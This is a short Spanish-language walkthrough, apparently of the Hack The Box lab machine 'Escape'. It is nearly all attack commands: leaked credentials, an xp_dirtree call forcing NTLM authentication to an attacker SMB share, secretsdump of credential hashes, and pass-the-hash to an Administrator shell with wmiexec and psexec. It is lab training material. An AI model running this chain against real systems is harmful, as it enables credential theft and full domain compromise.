---
title: "Escape"
---

# Escape

Con null session encontramos un pdf que likea creds para nuevos usuarios:

```bash
netexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' -d sequel.htb
```

```bash
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```

```bash
EXEC xp_dirtree '\\10.10.14.16\share', 1, 1
```

```
impacket-smbserver share ./share -smb2support
```

```bash
netexec winrm 10.10.11.202 -d sequel.htb -u sql_svc -p REGGIE1234ronnie
```

```
cd C:\SQLServer\Logs
type ERRORLOG.BAK
```

```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

```bash
evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3
```

```bash
impacket-secretsdump sequel.htb/ryan.cooper:'NuclearMosquito3'@10.10.11.202
```

```bash
impacket-wmiexec sequel.htb/Administrator@sequel.htb  -hashes 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee' -dc-ip 10.10.11.202
```

```bash
impacket-psexec sequel.htb/Administrator@sequel.htb  -hashes 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee' -dc-ip 10.10.11.202
```
